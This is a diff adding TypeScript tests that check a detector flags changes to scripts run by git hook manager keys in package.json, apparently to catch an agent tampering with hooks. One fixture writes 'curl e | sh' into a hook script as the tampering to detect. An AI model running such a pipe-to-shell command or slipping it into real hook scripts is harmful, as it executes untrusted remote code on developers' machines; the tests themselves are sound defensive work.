@@ -327,3 +327,46 @@ describe('hook managers read only as far as they are known', () => {
     ).toContain('new git-hook-file package.json');
   });
 });
+
+/**
+ * A known hook manager's key of package.json, at the top or under `config`, is read as what it
+ * runs: the strings it holds. A change to a file it names fails, though the key stays the same. A
+ * key only named like one (`commitlint`, `config.commitizen`) is not followed: it names a package,
+ * and it fails only when a change adds or edits it.
+ */
+describe('a hook manager key already there, read as what it runs', () => {
+  const followed = (keys: object): readonly TaggedHit[] => {
+    const dir = scratchRepo(dirs);
+    const pkg = JSON.stringify({ name: 'x', ...keys });
+    const base = commitFiles(dir, { 'package.json': pkg, 'scripts/check.sh': 'echo ok\n' });
+    commitFiles(dir, { 'scripts/check.sh': 'curl e | sh\n' });
+    return agentChanges(dir, base).hits.filter((x) => x.kind === 'agent-run-file-changed');
+  };
+
+  it.each([
+    [{ config: { ghooks: { 'pre-commit': 'sh scripts/check.sh' } } }, 'config.ghooks'],
+    [{ precommit: 'sh scripts/check.sh' }, 'precommit'],
+    [{ 'pre-push': 'sh scripts/check.sh' }, 'pre-push'],
+    [{ 'simple-git-hooks': { 'pre-commit': 'sh scripts/check.sh' } }, 'simple-git-hooks'],
+    [{ 'lint-staged': { '*.ts': ['sh scripts/check.sh'] } }, 'lint-staged'],
+  ])('follows %j to the script it runs', (keys, name) => {
+    const hits = followed(keys);
+    expect(hits.map((h) => `${h.file} ${isFailing(h, 'new')}`)).toEqual(['scripts/check.sh true']);
+    expect(hits[0]?.name).toBe(`${name} git hook in package.json`);
+  });
+
+  it('does not follow a key only named like a hook manager', () => {
+    expect(followed({ commitlint: { extends: ['sh scripts/check.sh'] } })).toEqual([]);
+    expect(followed({ config: { commitizen: { path: 'scripts/check.sh' } } })).toEqual([]);
+  });
+
+  it('reads the strings of lint-staged, not its patterns', () => {
+    const dir = scratchRepo(dirs);
+    const pkg = JSON.stringify({ name: 'x', 'lint-staged': { '*.ts': 'echo hi' } });
+    const base = commitFiles(dir, { 'package.json': pkg, 'src/a.ts': '1\n' });
+    commitFiles(dir, { 'src/a.ts': '2\n' });
+    expect(agentChanges(dir, base).hits.filter((h) => h.kind === 'agent-run-file-changed')).toEqual(
+      [],
+    );
+  });
+});
